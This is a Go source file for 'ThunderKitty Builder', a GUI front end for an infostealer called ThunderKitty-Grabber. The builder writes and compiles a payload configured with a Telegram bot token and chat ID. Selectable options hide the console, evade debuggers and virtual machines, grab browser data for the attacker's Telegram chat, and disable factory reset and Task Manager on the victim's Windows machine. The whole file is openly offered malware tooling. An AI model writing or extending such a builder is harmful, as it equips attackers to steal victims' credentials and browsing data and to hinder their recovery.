package main

import (
	"fmt"
	"os"
	"os/exec"
	"runtime"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/widget"
)

func buildExecutable(telebottoken, telechatid string, enableAntiDebug, enableBrowsers, hideConsole, disableFactoryReset, disableTaskManager bool) {
	content := fmt.Sprintf(`
package main

import (
	"ThunderKitty-Grabber/utils/antidbgandvm"
	"ThunderKitty-Grabber/utils/browsers"
	"ThunderKitty-Grabber/utils/hideconsole"
	"ThunderKitty-Grabber/utils/disablefactoryreset"
	"ThunderKitty-Grabber/utils/taskmanager"
	"ThunderKitty-Grabber/utils/exclude"
	"fmt"
)

const (
	telebottoken = "%s"
	telechatid   = "%s"
)

func main() {
	if %t {
		HideConsoleWindow.HideWindow()
	} else {
		fmt.Println("Console window not hidden")
	}
 	if %t {
		AntiDebugVMAnalysis.ThunderKitty()
	} else {
		fmt.Println("Anti-debugging and VM analysis not enabled")
	}

	Exclude.FileExtensions()
	if %t {
		browsers.ThunderKittyGrab(telebottoken, telechatid)
	} else {
		fmt.Println("Browser info grabbing not enabled")
	}

	if %t {
		FactoryReset.Disable()
	} else {
		fmt.Println("Factory reset not disabled")
	}

	if %t {
		TaskManager.Disable()
	} else {
		fmt.Println("Task manager not disabled")
	}
}
`, telebottoken, telechatid, enableAntiDebug, enableBrowsers, hideConsole, disableFactoryReset, disableTaskManager)

	file, err := os.Create("main.go")
	if err != nil {
		fmt.Println("Error creating main.go:", err)
		return
	}
	defer file.Close()

	_, err = file.WriteString(content)
	if err != nil {
		fmt.Println("Error writing to main.go:", err)
		return
	}

	cmd := exec.Command("go", "build", "main.go")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", "go build main.go")
	}
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	err = cmd.Run()
	if err != nil {
		fmt.Println("Error building executable:", err)
		return
	}

	fmt.Println("Build successful")
}

func main() {
	a := app.New()
	w := a.NewWindow("ThunderKitty Builder")

	telebottokenEntry := widget.NewEntry()
	telebottokenEntry.SetPlaceHolder("Enter telebottoken")

	telechatidEntry := widget.NewEntry()
	telechatidEntry.SetPlaceHolder("Enter telechatid")

	enableAntiDebug := widget.NewCheck("Enable Anti-Debugging", nil)
	enableBrowsers := widget.NewCheck("Enable Browser Info Grabbing", nil)
	hideConsole := widget.NewCheck("Hide Console Window", nil)
	disableFactoryReset := widget.NewCheck("Disable Factory Reset", nil)
	disableTaskManager := widget.NewCheck("Disable Task Manager", nil)

	buildButton := widget.NewButton("Build", func() {
		telebottoken := telebottokenEntry.Text
		telechatid := telechatidEntry.Text
		buildExecutable(telebottoken, telechatid, enableAntiDebug.Checked, enableBrowsers.Checked, hideConsole.Checked, disableFactoryReset.Checked, disableTaskManager.Checked)
	})

	form := container.NewVBox(
		widget.NewLabel("ThunderKitty Configuration"),
		telebottokenEntry,
		telechatidEntry,
		enableAntiDebug,
		enableBrowsers,
		hideConsole,
		disableFactoryReset,
		disableTaskManager,
		buildButton,
	)

	w.SetContent(form)
	w.Resize(fyne.NewSize(400, 350))
	w.ShowAndRun()
}
